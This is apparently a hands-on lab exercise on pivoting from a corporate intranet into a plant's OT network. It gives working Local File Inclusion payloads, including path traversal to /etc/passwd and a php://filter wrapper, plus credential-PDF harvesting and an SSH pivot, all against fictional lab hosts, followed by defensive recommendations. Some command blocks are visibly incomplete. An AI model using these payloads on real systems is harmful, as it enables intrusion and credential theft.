    Exercise ICSPT-2.1: From Phish to Foothold

    Engagement Status

    Client Masa Foods, Inc. (fictional)
    Role OT Security Engineer, Plant 1
    Phase Discovery Enumeration Exploitation Reporting

    What you know so far: You have completed all four Phase 1 (Level 1) exercises: Purdue-level mapping, asset inventory, PCAP decoding, and traffic attribution. You have never left the Plant 1 operations VLAN. Reyna Alvarado now wants to see the enterprise-to-OT pivot that Corporate IT has warned about.

    Environment Checklist

    Every ICSPT exercise assumes you read the Before-You-Begin section in Exercise 1.1 (Touring Masa Foods) first. If you have not, open that page now: it explains the two attacker-host options (your own Kali over VPN, or the browser-mounted RangeBox) and walks you through the one-time /etc/hosts setup that lets you call every target by its friendly name.

    Exercise 2.1 introduces two new hosts that are not part of the Plant 1 stack from Level 1: a corporate intranet at corpweb.masa.local and the Plant 1 jump host at jumpserver.masa.local. Add them to /etc/hosts now using the IPs from the Exercise Network panel (labels corpweb and jumpserver):

    Kali (one-time for Exercise 2.1)

    # Replace the example IPs with the values from the Exercise Network panel.
# Exercise 2.1 uses offsets .8 (corpweb) and .9 (jumpserver).
sudo tee -a /etc/hosts <<'HOSTS'

10.100.42.9   jumpserver.masa.local

    Confirm name resolution and reachability:

    Kali

    getent hosts corpweb.masa.local jumpserver.masa.local
nc -zv corpweb.masa.local 80
nc -zv jumpserver.masa.local 22

    Expected: two name-to-IP lines, succeeded! on HTTP/80 for corpweb, and succeeded! on SSH/22 for jumpserver. If either probe fails, the lab is not Running yet; fix connectivity (VPN tunnel or RangeBox + exercise relaunch) before continuing.

    Scenario

    Corporate IT has been warning Masa leadership for a year that the in-house intranet application "has some old code in it." The warnings have gone unheeded. Reyna Alvarado wants concrete evidence for the quarterly review: a demonstration that a phishing click on a single Masa employee's laptop could reach a Plant 1 jump host in under an hour.

    Why this matters

    Executives do not believe that a phishing click on a finance laptop can reach a tortilla oven. The cognitive distance between "Dana in accounting clicked a link" and "someone is writing to an OT controller" is too long to cross in a board meeting. Every pen test that tries to explain the pivot chain in a slide deck loses. Every pen test that shows the pivot chain end to end in a live demo wins.

    The pivot demo is the single most valuable pen-tester deliverable for an OT client that has no segmentation between IT and OT. Three concrete outcomes hinge on whether you can execute it cleanly:

    • Segmentation budget approval. The number one reason Masa has no DMZ between corporate and operations is that nobody has ever put a working pivot chain in front of the CFO. Once you do, the cost of a dedicated OT firewall stops being theoretical and starts being compared against the cost of the demo you just ran.
    • Vendor-access policy reform. The ot_vpn_creds.pdf file you are going to find in the intranet tree exists because Corporate IT wanted to make life easy for OT engineers and stored credentials in the shared filesystem. Reform conversations never happen until someone demonstrates that storing credentials in a shared filesystem has a cost. You are about to provide the demonstration.
    • Adversary playbook mapping. Stuxnet, TRITON, and Industroyer all used variants of exactly this pivot chain: compromised IT endpoint, credential harvest from a shared store, SSH or RDP pivot into an engineering workstation, PLC write. If you can execute the chain in under an hour on a plant that thought it was safe, any real adversary with budget can execute it in under a day.

    You start with network access to the corporate intranet at http://corpweb.masa.local/. The application has a Local File Inclusion (LFI) vulnerability in its page loader. Your job is to exploit the LFI, read a credential file that Corporate IT stored inside the intranet tree, and use those credentials to SSH into the Plant 1 jump host at jumpserver.masa.local. Once logged in as the OT engineering account, pull the handoff-notes file that the outgoing engineer left for the new hire. The file contains the flag.

    You will not interact with any PLC during this exercise. The pivot chain stops at the jump host.

    Background: Local File Inclusion

    Local File Inclusion is one of the oldest still-exploited classes of web vulnerabilities. In PHP it occurs when an application passes user-controlled input directly to include(), require(), or readfile() without validating the path. The classic pattern looks like:

    $page = $_GET['page'];
include("pages/" . $page . ".php");

    Any user who can control the page query parameter can traverse out of the pages/ directory using ../ and include arbitrary files on the filesystem. If the application also has a fallback branch that reads non-PHP files via readfile() when the .php suffix does not exist, the attacker can pull plain text files back to the browser.

    LFI is a foothold, not a shellcode delivery mechanism on its own. In this exercise LFI is enough to harvest credentials stored in a file inside the web root, and the credentials are the real prize. In real engagements LFI chains often follow one of three paths:

    1. Config file harvesting. Read application config files (database credentials, API keys, admin passwords) to pivot laterally
    2. Log poisoning. Inject PHP into a log file (access log, error log, mail log) and then include the log file, turning LFI into RCE
    3. PHP wrappers. Use php://filter or data:// to bypass filters and read or execute arbitrary PHP

    Today's exercise is path 1. The intranet team stored a plaintext credential file in config/ next to the page loader. Corporate IT reviewed the code months ago, flagged it, and was told "we will fix it next sprint." The file is still there.

    Why the intranet team put credentials in a file

    Real plants do this for reasonable-sounding reasons: the intranet application needs to link out to plant-side services, the plant-side services need shared credentials, and the intranet team does not want to store secrets in a database they do not own. The fix is a secret manager, not a text file. The practical reality is that text files on the filesystem are common in OT environments and are always worth checking when you find an LFI.

    Walkthrough

    Step 1: Confirm corpweb Is Reachable and Running

    After finishing the Environment Checklist above, confirm the intranet loads.

    Kali

    nmap -n -Pn -p 80,443 corpweb.masa.local
curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://corpweb.masa.local/
    Expected output 

    PORT   STATE  SERVICE
80/tcp open   http
443/tcp closed https

HTTP 302
    The 302 redirect comes from index.php sending you to include.php?page=home. Follow the redirect in your browser or pass -L to curl.

    Step 2: Explore the Intranet by Hand

    Open http://corpweb.masa.local/ in your browser (Firefox or Chromium works fine). Click through the navigation links and watch the address bar: every page loads via ?page=<name> on the URL. Right-click and choose View Page Source, or press Ctrl+U, to read the raw HTML and confirm the loader pattern. Anything the curl block below does, you can also do straight in the browser, because the page parameter is a simple GET. The terminal version just pulls all four headings at once for a quick survey.

    Kali

    curl -s "http://corpweb.masa.local/include.php?page=home"     | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=about"    | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=contact"  | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=announcements" | grep -o '<h2>[^<]*</h2>'
    Expected output 

    <h2>Welcome to the Masa Foods Intranet</h2>
<h2>About Masa Foods</h2>
<h2>Contact</h2>
<h2>Announcements</h2>
    All four navigation links work. The announcements page is the most interesting one: it mentions "Jump host access is handled through the Corporate IT ticket queue and credentials are stored in the usual config location." That sentence is your hint that a credential file lives somewhere under the web root.

    Step 3: Probe for the LFI

    The classic first test is ../../../etc/passwd. If the application is vulnerable, the response includes the file's contents. Because the LFI lives in a GET parameter, you have three equivalent ways to send it, and a real assessment uses whichever fits the moment:

    • Browser: paste http://corpweb.masa.local/include.php?page=../../../etc/passwd into the address bar and read the result on the page. If the browser tries to render it, press Ctrl+U to see the raw text.
    • Burp Suite: intercept any page request, send it to Repeater (Ctrl+R), change the page value to the traversal string, and resend. Repeater is the standard tool for iterating on a web payload, and it keeps a history of every variant you try.
    • curl: the command below, which is handy when you want to grep the response or script the request.

    Kali (curl option)

    curl -s "http://corpweb.masa.local/include.php?page=../../../etc/passwd" | grep -E 'root:|www-data:'
    Expected output 

    root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    The response confirms the LFI. Notice the application is running as www-data, which is a normal PHP-FPM setup.

    Why the .php suffix does not stop you

    The vulnerable loader first tries pages/<page>.php. If that file does not exist, it falls back to reading pages/<page> directly with readfile(). So ?page=../../../etc/passwd hits the fallback branch: there is no pages/../../../etc/passwd.php file, so the loader tries pages/../../../etc/passwd which resolves to /etc/passwd.

    Step 4: Find and Download the Credential PDF

    Announcements mentioned a "config location." Standard PHP application layout puts config files in config/ at the same level as the page loader. First look at what lives in the config directory by reading the intranet.ini file Corporate IT mentions in the announcements.

    Kali

    curl -s "http://corpweb.masa.local/include.php?page=../config/intranet.ini" | grep -A 10 "<pre>"

    Two PDF files sit in /config/ next to intranet.ini: acceptable_use_policy.pdf and ot_vpn_creds.pdf. The file names tell you which is the distractor (the AUP) and which is the credential target. Download the credential PDF. You can navigate the browser straight to http://corpweb.masa.local/include.php?page=../config/ot_vpn_creds.pdf and the intranet streams it as a PDF your browser opens or saves; or use curl to grab the raw bytes:

    Kali (curl option)

    # The corpweb intranet has a binary-aware fallback that streams
# PDFs as application/pdf with the right Content-Disposition header,
# so curl downloads the raw bytes instead of a template-wrapped
# preview. Save to a scratch path and sanity-check the type.
curl -s -o /tmp/ot_vpn_creds.pdf \
  "http://corpweb.masa.local/include.php?page=../config/ot_vpn_creds.pdf"
file /tmp/ot_vpn_creds.pdf
ls -la /tmp/ot_vpn_creds.pdf
    Expected output 

    /tmp/ot_vpn_creds.pdf: PDF document, version 1.4, 1 page(s)
-rw-r--r-- 1 kali kali 2284 Apr 11 23:00 /tmp/ot_vpn_creds.pdf
    A valid PDF, 2284 bytes. Now extract the text.

    Kali

    pdftotext /tmp/ot_vpn_creds.pdf -
    Expected output (trimmed) 

    Masa Foods Corporate IT
Plant 1 Remote Access Credentials
Document classification: INTERNAL. Do not share outside Masa OT engineering.
...

Jump host (Plant 1 operations VLAN)
Host: jumpserver.masa.local
Port: 22

OT engineering account (read-only PLC access)
Username: ot_engineer
Password: masa_ot_2025

Incident response: contact help@masa.local
    The username and password are on the last two lines. Record them in your engagement log.

    About the distractor

    If you downloaded acceptable_use_policy.pdf by mistake, pdftotext will show an IT policy signed by Marcus Holloway with nothing useful in it. Both files live at the same LFI path prefix; reading the file names before downloading saves you one pdftotext round-trip. In a real engagement, a credential-bearing PDF hides in a folder next to three or four harmless lookalikes. Practice the habit of reading names first.

    Step 5: Pivot via SSH into the Jump Host

    Use the recovered credentials to SSH into jumpserver.masa.local. The jump host only allows password authentication as the ot_engineer user.

    Kali

    Expected output

ot_engineer

    Output Interpretation

    • A 302 redirect from the intranet index to include.php?page=home is a clean signal that every page flows through the vulnerable loader
    • The /etc/passwd response with www-data confirms the LFI reaches the whole filesystem, not just the intranet tree. Real engagements use this to enumerate the host OS, find other users, and spot container escape hints
    • readfile() style LFI wraps the output in <pre> tags in this intranet template. That is a quirk of the specific application, not a general rule
    • The 600 mode on OTSecurity-handoff.txt is the reason SSH is required. In a real engagement you would note this as a "defense-in-depth worked" finding: even with LFI on the web host, this specific file was only accessible via a separate authentication layer

    Analysis Questions

    1. Why did the intranet team store credentials in a plaintext file instead of a secret manager or an environment variable?

    Reveal answer

    Several reasons, all common in the field: the intranet team did not own the plant-side services and could not propagate environment variables between IT and OT teams cleanly; the intranet codebase predated the company's secret manager rollout; nobody wanted to be the person who broke the intranet on a Friday afternoon to migrate the credentials. None of those reasons are good, but all of them are realistic. The fix is to rotate the credentials as soon as the LFI is patched, move the secret into a vault, and audit the intranet for other plaintext secrets.

    2. The LFI reached /etc/passwd via ../../../etc/passwd. How many directory traversal hops are needed to reach an absolute path like /etc/passwd from the PHP loader's starting directory?

    Reveal answer

    The loader's base is /var/www/html/pages/. Three .. hops move up to /, then etc/passwd finishes the path. The actual count depends on the exact starting directory; /etc/passwd on this container works with anything from three to six hops because PHP normalizes the path.

    3. Could you have reached the same credentials via php://filter?

    Reveal answer

    Yes. ?page=php://filter/convert.base64-encode/resource=../config/ot_vpn_creds.pdf would return a base64-encoded blob that decodes to the same PDF bytes. The wrapper approach is more useful when the target file contains PHP tags that would be executed by include(), or when the webserver's fallback branch mangles binary output. For the corpweb intranet the binary-aware fallback in include.php already serves the PDF with the right Content-Type, so direct path traversal is the short path. Base64 wrappers become necessary on real CMS engines that wrap every output in HTML.

    4. The handoff file has mode 600. Why did SSH succeed even though a random web user cannot reach the file via LFI?

    Reveal answer

    The LFI runs as www-data, which is not ot_engineer, so the 600 permission blocks the LFI path entirely. SSH succeeds because ot_engineer authenticates as the actual file owner, and the OS enforces the same permission bit in the owner's favor. Mode 600 is a defense-in-depth control that successfully prevented a web-side compromise from reading the file.

    Defensive Recommendations to Masa

    Finding Risk Mitigation
    LFI in include.php?page= parameter Critical Sanitize the $page parameter against a hardcoded allowlist of page names, and fail closed on anything else
    Plaintext OT credentials in the intranet tree Critical Move the file to a secrets manager and rotate the credentials (they are now burned)
    Jump host password authentication High Switch to SSH public-key authentication, disable password auth in sshd_config
    No logging of include.php requests with traversal patterns Medium Deploy a web application firewall rule or log analysis job that alerts on ../ in the query string
    No segmentation between the corporate network and the Plant 1 operations VLAN Critical Place the jump server behind a dedicated OT firewall with allowlisted source IPs from the engineering workstation subnet only

    Key Takeaways

    • Local File Inclusion is still common in plant-adjacent web applications because the code is old, the team is small, and the pressure to ship is high
    • LFI is a foothold, not a shellcode delivery mechanism. The value is in what files you can read with it
    • Credential files inside the web root are the first thing to check after LFI is confirmed. Application config directories are always worth enumerating
    • Network pivot via SSH is the canonical way to cross from corporate to OT in a real engagement, and the jump host is the single most important host to harden
    • Defense-in-depth (file permissions on the jump host) can prevent a web-side compromise from escalating into an OT compromise, but only if the defender has the discipline to keep both layers tight
